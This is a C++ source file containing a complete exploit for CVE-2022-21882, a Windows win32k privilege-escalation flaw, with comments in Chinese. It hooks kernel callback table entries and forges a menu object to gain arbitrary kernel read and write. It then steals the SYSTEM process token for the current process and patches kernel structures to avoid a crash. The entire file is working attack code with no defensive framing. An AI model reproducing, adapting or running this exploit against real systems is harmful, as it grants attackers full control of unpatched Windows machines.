#include "CVE-2022-21882.h"

namespace CVE_2022_21882
{
	lpfnxxxClientAllocWindowClassExtraBytes g_orgClientAllocWindowExtraBytes = NULL;
	lpfnNtCallbackReturn fnNtCallbackReturn = NULL;
	lpfnNtUserConsoleControl fnNtUserConsoleControl = NULL;
	lpfnNtUserMessageCall fnNtUserMessageCall = NULL;
	lpfnxxxClientFreeWindowClassExtraBytes g_orgClientFreeWindowClassExtraBytes = NULL;
	HWND g_hWnd[2] = { NULL };
	ULONG64 g_pWnd[2] = { NULL };
	HWND g_hTriggerWnd = NULL;
	DWORD g_dwWndExtra = 0x1900;
	DWORD CONST g_cbWndExtra_offset = 0xC8, g_ExtraBytes_offset = 0x128;
	QWORD g_qwKernelHeapOffset0 = 0, g_qwKernelHeapOffset1 = 0, g_qwWndOffset = 0;
	QWORD g_qwMenu = 0;
}

using namespace CVE_2022_21882;

BOOL Exploit_CVE_2022_21882()
{
	BOOL bRet = TRUE;

	if (!Init_CVE_2022_21882())
	{
		bRet = FALSE;
		goto exit;
	}

	if (!HookFunc_CVE_2022_21882())
	{
		bRet = FALSE;
		goto exit;
	}

	fnNtUserMessageCall(g_hTriggerWnd, WM_CREATE, 0, 0, NULL, 0, FALSE);
	
	// 将g_hWnd[0]的cbwndExtra设为0xFFFFFFFF
	if (!SetWindowLongPtr(g_hTriggerWnd, g_cbWndExtra_offset + 0x10, 0xFFFFFFFF) &&
		GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}
	
	// g_hWnd[1]的style加入WS_CHILD 
	DWORD dwStyleOffset = 0x18;
	QWORD qwStyle = *(PQWORD)(g_pWnd[1] + dwStyleOffset);

	qwStyle |= 0x4000000000000000;

	if (!SetWindowLongPtr(g_hWnd[0], g_qwWndOffset + dwStyleOffset, qwStyle) &&
		GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

	// 将伪造的tagMENU设置到g_hWnd[1]中
	QWORD qwSPMenu = SetWindowLongPtr(g_hWnd[1], GWLP_ID, g_qwMenu);

	if (!qwSPMenu && GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

	// 删除g_hWnd[1]的WS_CHILD
	qwStyle &= ~0x4000000000000000;
	if (!SetWindowLongPtr(g_hWnd[0], g_qwWndOffset + dwStyleOffset, qwStyle) &&
		GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

	if (!EnablePrivileges_CVE_2022_21882())
	{
		bRet = FALSE;
		goto exit;
	}

	// 修复数据，防止蓝屏
	lHMValidateHandle HMValidateHandle = (lHMValidateHandle)GetHMValidateHandle();
	QWORD qwTriggerHead = (QWORD)HMValidateHandle(g_hTriggerWnd, TYPE_WINDOW);
	QWORD qwWndOffset = *(PQWORD)(g_pWnd[0] + g_ExtraBytes_offset);
	QWORD qwTriggerOffset = *(PQWORD)(qwTriggerHead + 8);

	if (qwWndOffset > qwTriggerOffset)
	{
		printf("qwWndOffset to larger\n");
		goto exit;
	}

	qwWndOffset = qwTriggerOffset - qwWndOffset;

	DWORD dwFlagsOffset = 0xE8;

	DWORD dwFlags = *(PDWORD)(qwTriggerHead + dwFlagsOffset);

	dwFlags &= ~0x800;
	if (!SetWindowLongPtr(g_hWnd[0], qwWndOffset + dwFlagsOffset, dwFlags) &&
		GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

	QWORD qwBuffer = (QWORD)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, g_dwWndExtra);
	if (!qwBuffer)
	{
		bRet = FALSE;
		ShowError("HeapAlloc", GetLastError());
		goto exit;
	}

	if (!SetWindowLongPtr(g_hWnd[0], qwWndOffset + g_ExtraBytes_offset, qwBuffer) &&
		GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

	// 增加g_hWnd[1]的WS_CHILD
	qwStyle |= 0x4000000000000000;
	if (!SetWindowLongPtr(g_hWnd[0], g_qwWndOffset + dwStyleOffset, qwStyle) &&
		GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

	// 恢复g_hWnd[1]的spMenu
	if (!SetWindowLongPtr(g_hWnd[1], GWLP_ID, qwSPMenu) && GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

	// 删除g_hWnd[1]的WS_CHILD
	qwStyle &= ~0x4000000000000000;
	if (!SetWindowLongPtr(g_hWnd[0], g_qwWndOffset + dwStyleOffset, qwStyle) &&
		GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}

BOOL EnablePrivileges_CVE_2022_21882()
{
	BOOL bRet = TRUE;
	CONST DWORD dwLinkOffset = 0x448, dwPIDOffset = 0x440, dwTokenOffset = 0x4B8;

	QWORD qwSytemAddr = GetSystemProcess();
	if (!qwSytemAddr)
	{
		bRet = FALSE;
		goto exit;
	}

	// 获取system进程EPROCESS的地址和Token
	QWORD qwEprocess = ReadData_CVE_2022_21882(qwSytemAddr);
	QWORD qwSystemToken = ReadData_CVE_2022_21882(qwEprocess + dwTokenOffset);

	// 找到当前进程的EPROCESS
	QWORD qwCurPID = GetCurrentProcessId(), qwPID = 0;

	do {
		qwEprocess = ReadData_CVE_2022_21882(qwEprocess + dwLinkOffset) - dwLinkOffset;
		qwPID = ReadData_CVE_2022_21882(qwEprocess + dwPIDOffset);
	} while (qwPID != qwCurPID);

	// 替换Token
	if (!WriteData_CVE_2022_21882((PVOID)(qwEprocess + dwTokenOffset), qwSystemToken))
	{
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL WriteData_CVE_2022_21882(PVOID pTarAddress, QWORD qwValue)
{
	BOOL bRet = TRUE;

	if (!SetWindowLongPtr(g_hWnd[0], g_qwWndOffset + g_ExtraBytes_offset, (QWORD)pTarAddress) &&
		GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

	if (!SetWindowLongPtr(g_hWnd[1], 0, qwValue) && GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}

QWORD ReadData_CVE_2022_21882(QWORD pTarAddress)
{
	BYTE bValue[0x8] = { 0 };

	RECT Rect = { 0 };
	if (!GetWindowRect(g_hWnd[1], &Rect))
	{
		ShowError("GetWindowRect", GetLastError());
		goto exit;
	}

	MENUBARINFO mbi = { 0 };

	mbi.cbSize = sizeof(mbi);
	*(PQWORD)(*(PQWORD)(g_qwMenu + 0x58)) = pTarAddress - 0x40;

	if (!GetMenuBarInfo(g_hWnd[1], -3, 1, &mbi))
	{
		ShowError("GetMenuBarInfo", GetLastError());
		goto exit;
	}

	*(PDWORD)bValue = mbi.rcBar.left - Rect.left;
	*(PDWORD)(bValue + 4) = mbi.rcBar.top - Rect.top;

exit:
	return *(PQWORD)bValue;
}

BOOL Init_CVE_2022_21882()
{
	BOOL bRet = TRUE;
	DWORD i = 0;

	lHMValidateHandle HMValidateHandle = NULL;

	HMValidateHandle = (lHMValidateHandle)GetHMValidateHandle();
	if (!HMValidateHandle)
	{
		bRet = FALSE;
		goto exit;
	}

	HMODULE hNtDll = NULL, hWin32Dll = NULL;

	hNtDll = LoadLibrary("ntdll.dll");
	hWin32Dll = LoadLibrary("win32u.dll");

	if (!hNtDll || !hWin32Dll)
	{
		bRet = FALSE;
		ShowError("LoadLibrary", GetLastError());
		goto exit;
	}

	fnNtCallbackReturn = (lpfnNtCallbackReturn)GetProcAddress(hNtDll, "NtCallbackReturn");
	fnNtUserConsoleControl = (lpfnNtUserConsoleControl)GetProcAddress(hWin32Dll, "NtUserConsoleControl");
	fnNtUserMessageCall = (lpfnNtUserMessageCall)GetProcAddress(hWin32Dll, "NtUserMessageCall");

	if (!fnNtCallbackReturn || !fnNtUserConsoleControl || !fnNtUserMessageCall)
	{
		bRet = FALSE;
		ShowError("GetProcAddress", GetLastError());
		goto exit;
	}

	HINSTANCE handle = NULL;

	handle = GetModuleHandle(NULL);
	if (!handle)
	{
		bRet = FALSE;
		ShowError("GetModuleHandle", GetLastError());
		goto exit;
	}

	WNDCLASSEX wndClass = { 0 };
	PCHAR pClassName = "leak";

	wndClass.cbWndExtra = 0x20;
	wndClass.cbSize = sizeof(wndClass);
	wndClass.style = CS_VREDRAW | CS_HREDRAW;
	wndClass.hInstance = handle;
	wndClass.lpfnWndProc = DefWindowProc;
	wndClass.lpszClassName = pClassName;

	if (!RegisterClassEx(&wndClass))
	{
		bRet = FALSE;
		ShowError("RegisterClassEx", GetLastError());
		goto exit;
	}

	HMENU hMenu = NULL, hHelpMenu = NULL;
	HWND hWnd = NULL;

	for (i = 0; i < 2; i++)
	{
		if (i == 1)
		{
			// 从第1个tagWND开始将带有tagMENU对象
			hMenu = CreateMenu();
			hHelpMenu = CreateMenu();
			if (!hMenu || !hHelpMenu)
			{
				bRet = FALSE;
				ShowError("CreateMenu", GetLastError());
				goto exit;
			}

			if (!AppendMenu(hHelpMenu, MF_STRING, 0x1888, TEXT("about")) &&
				!AppendMenu(hMenu, MF_POPUP, (LONG)hHelpMenu, TEXT("help")))
			{
				bRet = FALSE;
				ShowError("AppendMenu", GetLastError());
				goto exit;
			}
		}

		hWnd = CreateWindowEx(WS_EX_NOACTIVATE,
							  pClassName,
							  NULL,
							  WS_DISABLED,
							  0, 0, 0, 0,
							  NULL,
							  hMenu,
							  handle,
							  NULL);
		if (!hWnd)	continue;

		g_hWnd[i] = hWnd;
		g_pWnd[i] = (ULONG64)HMValidateHandle(hWnd, TYPE_WINDOW);

		if (i == 0)
		{
			g_qwKernelHeapOffset0 = *(PQWORD)(g_pWnd[i] + 8);
			BYTE bInfo[0x10] = { 0 };
			*(HWND *)bInfo = g_hWnd[0];
			fnNtUserConsoleControl(6, bInfo, sizeof(bInfo));

			g_qwWndOffset = *(PQWORD)(g_pWnd[i] + g_ExtraBytes_offset);
		}
	}

	g_qwKernelHeapOffset1 = *(PQWORD)(g_pWnd[1] + 8);

	if (g_qwWndOffset > g_qwKernelHeapOffset1)
	{
		bRet = FALSE;
		printf("g_pWnd[0] offset is invalid!\n");
		goto exit;
	}

	g_qwWndOffset = g_qwKernelHeapOffset1 - g_qwWndOffset;

	PCHAR pTriggerName = "Trigger";
	WNDCLASSEX wc = { 0 };

	wc.cbSize = sizeof(wc);
	wc.lpfnWndProc = DefWindowProc;
	wc.style = CS_VREDRAW | CS_HREDRAW;
	wc.cbWndExtra = g_dwWndExtra;			// 指定特定的大小
	wc.hInstance = handle;
	wc.lpszClassName = pTriggerName;

	if (!RegisterClassEx(&wc))
	{
		bRet = FALSE;
		ShowError("RegisterClassEx", GetLastError());
		goto exit;
	}

	g_hTriggerWnd = CreateWindowEx(WS_EX_NOACTIVATE,
								   pTriggerName,
								   NULL,
								   WS_DISABLED,
								   0, 0, 0, 0,
								   NULL,
								   NULL,
								   handle,
								   NULL);

	if (!g_hTriggerWnd)
	{
		bRet = FALSE;
		ShowError("CreateWindowEx", GetLastError());
		goto exit;
	}

	// 伪造tagMENU
	HANDLE hProcHeap = NULL;

	hProcHeap = GetProcessHeap();
	if (!hProcHeap)
	{
		bRet = FALSE;
		ShowError("GetProcessHeap", GetLastError());
		goto exit;
	}

	DWORD dwHeapFlags = HEAP_ZERO_MEMORY;
	g_qwMenu = (QWORD)HeapAlloc(hProcHeap, dwHeapFlags, 0xA0);
	if (!g_qwMenu)
	{
		bRet = FALSE;
		ShowError("GetProcessHeap", GetLastError());
		goto exit;
	}

	*(PQWORD)(g_qwMenu + 0x98) = (QWORD)HeapAlloc(hProcHeap, dwHeapFlags, 0x20);
	*(PQWORD)(*(PQWORD)(g_qwMenu + 0x98)) = g_qwMenu;

	*(PQWORD)(g_qwMenu + 0x28) = (QWORD)HeapAlloc(hProcHeap, dwHeapFlags, 0x200);
	*(PQWORD)(*(PQWORD)(g_qwMenu + 0x28) + 0x2C) = 1;
	*(PQWORD)(g_qwMenu + 0x58) = (QWORD)HeapAlloc(hProcHeap, dwHeapFlags, 0x8);
	*(PDWORD)(g_qwMenu + 0x40) = 1;
	*(PDWORD)(g_qwMenu + 0x44) = 2;

exit:
	return bRet;
}

NTSTATUS NewxxxClientAllocWindowClassExtraBytes(PVOID arg0)
{
	if (*(PDWORD)arg0 == g_dwWndExtra)
	{
		BYTE bInfo[0x10] = { 0 };

		// tagWND->Flag |= 0x800
		*(HWND *)bInfo = g_hTriggerWnd;
		fnNtUserConsoleControl(6, bInfo, sizeof(bInfo));

		BYTE bRes[0x18] = { 0 };

		// 设置tagWND->pExtraBytes
		*(PQWORD)bRes = g_qwKernelHeapOffset0;
		return fnNtCallbackReturn(bRes, sizeof(bRes), 0);
	}

	return g_orgClientAllocWindowExtraBytes(arg0);
}

NTSTATUS NewxxxFreeAllocWindowClassExtraBytes(PVOID pInfo)
{
	QWORD pwnd = *(PQWORD)pInfo;

	if (*(PDWORD)(pwnd + g_cbWndExtra_offset) == g_dwWndExtra)
	{
		return 1;
	}

	return g_orgClientFreeWindowClassExtraBytes(pInfo);
}

BOOL HookFunc_CVE_2022_21882()
{
	BOOL bRet = TRUE;
	QWORD ulKernelCallBackTable = *(PQWORD)(__readgsqword(0x60) + 0x58);

	DWORD dwOldProtect = 0;

	if (!VirtualProtect((PVOID)ulKernelCallBackTable, PAGE_SIZE, PAGE_READWRITE, &dwOldProtect))
	{
		bRet = FALSE;
		ShowError("VirtualProtect", GetLastError());
		goto exit;
	}

	g_orgClientAllocWindowExtraBytes = (lpfnxxxClientAllocWindowClassExtraBytes)*(PQWORD)(ulKernelCallBackTable + 0x8 * 0x7B);
	*(PQWORD)(ulKernelCallBackTable + 0x8 * 0x7B) = (QWORD)NewxxxClientAllocWindowClassExtraBytes;

	g_orgClientFreeWindowClassExtraBytes = (lpfnxxxClientFreeWindowClassExtraBytes)*(PQWORD)(ulKernelCallBackTable + 0x8 * 0x7C);
	*(PQWORD)(ulKernelCallBackTable + 0x8 * 0x7C) = (QWORD)NewxxxFreeAllocWindowClassExtraBytes;

	if (!VirtualProtect((PVOID)ulKernelCallBackTable, PAGE_SIZE, dwOldProtect, &dwOldProtect))
	{
		bRet = FALSE;
		ShowError("VirtualProtect", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}